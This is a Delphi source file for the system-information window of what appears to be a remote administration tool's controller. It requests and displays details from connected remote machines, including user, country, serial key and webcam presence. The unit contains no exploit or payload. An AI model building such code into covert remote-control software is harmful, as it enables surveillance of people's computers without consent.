unit UnitSystemInfo;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP,
  ComCtrls, ImgList, ToolWin, Menus, ClipBrd, UnitSharedData;

type
  TSystemInformation = class(TForm)
    StatusBar1: TStatusBar;
    ListView1: TListView;
    ListView2: TListView;
    ImageList1: TImageList;
    PopupMenu1: TPopupMenu;
    Refresh1: TMenuItem;
    SaveToFile1: TMenuItem;
    Timer1: TTimer;
    SaveDialog1: TSaveDialog;
    Timer2: TTimer;
    procedure ListView1AdvancedCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; Stage: TCustomDrawStage;
      var DefaultDraw: Boolean);
    procedure Refresh1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure SaveToFile1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Timer2Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    Group,Computer,User: string;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
  end;

var
  SystemInformation: TSystemInformation;

implementation

{$R *.dfm}

procedure SendData(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'SystemInfo|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if TSystemInformation(SocketData.Form).NewSocket = nil then exit;
  TSystemInformation(SocketData.Form).NewSocket := nil;
  TSystemInformation(SocketData.Form).Caption := TSystemInformation(SocketData.Form).Caption + ' - [Offline]';
  TSystemInformation(SocketData.Form).Timer1.Enabled := True;
end;

procedure TSystemInformation.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  Timer1.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
  Refresh1.Click;
end;

procedure TSystemInformation.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  d: string;
  Strings: TStringList;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Information' then begin
    Timer2.Enabled := True;
    
    Strings := TStringList.Create;
    Strings.Text := Data;

    try
      Listview1.Items[1].Caption := SocketData.ServerData.Computer;
      Listview1.Items[4].Caption := SocketData.ServerData.User;

      Listview1.Items[7].Caption := Strings[1];
      Listview1.Items[8].Caption := Strings[2];
      Listview1.Items[9].Caption := Strings[3];

      Listview1.Items[12].Caption := SocketData.ServerData.Country; //Strings[4];
      Listview1.Items[15].Caption := Strings[5];
      Listview1.Items[18].Caption := Strings[6];
      Listview1.Items[21].Caption := Strings[7];
      Listview1.Items[24].Caption := SocketData.ServerData.SerialKey;

      Listview2.Items[1].Caption := Strings[8];
      Listview2.Items[4].Caption := Strings[9];
      Listview2.Items[5].Caption := Strings[15];
      Listview2.Items[8].Caption := Strings[10];
      Listview2.Items[11].Caption := Strings[11];
      Listview2.Items[14].Caption := Strings[12];
      Listview2.Items[17].Caption := SocketData.ServerData.Webcam;
      Listview2.Items[20].Caption := Strings[13];
      Listview2.Items[23].Caption := Strings[14];


    except
    end;
    Strings.Free;

  end;

end;

procedure TSystemInformation.ListView1AdvancedCustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  Stage: TCustomDrawStage; var DefaultDraw: Boolean);
begin
  if Item.StateIndex = 7 then begin
    TListview(Sender).Canvas.Font.Style := [fsBold];
    TListview(Sender).Canvas.Font.Color := clBlack;
  end else begin
    TListview(Sender).Canvas.Font.Style := [];
    TListview(Sender).Canvas.Font.Color := $004E4E4E; //clGray;
  end;
end;

procedure TSystemInformation.Refresh1Click(Sender: TObject);
begin
  SendData(NewSocket,'Information');
end;

procedure TSystemInformation.Timer1Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;
    UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|SystemInfoSocket|' + inttostr(Self.Handle));
end;

procedure TSystemInformation.SaveToFile1Click(Sender: TObject);
var
  i: integer;
  s: string;
  stream: tmemorystream;
begin
  if not SaveDialog1.Execute then exit;
  for i := 0 to Listview1.Items.Count -1 do begin
    s := s + Listview1.Items[i].Caption + #13#10;
  end;
  for i := 0 to Listview2.Items.Count -1 do begin
    s := s + Listview2.Items[i].Caption + #13#10;
  end;
  stream := tmemorystream.Create;
  stream.Write(pointer(s)^,length(s));
  stream.SaveToFile(SaveDialog1.FileName);
  stream.Free;
end;

procedure TSystemInformation.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
begin
  Action := caFree;
  try
    TmpSocket := NewSocket;
    NewSocket := nil;
    if TmpSocket <> nil then TmpSocket.Close;
  except
  end;
end;

procedure TSystemInformation.Timer2Timer(Sender: TObject);
begin
  Timer2.Enabled := False;
  Refresh1.Click;
end;

end.
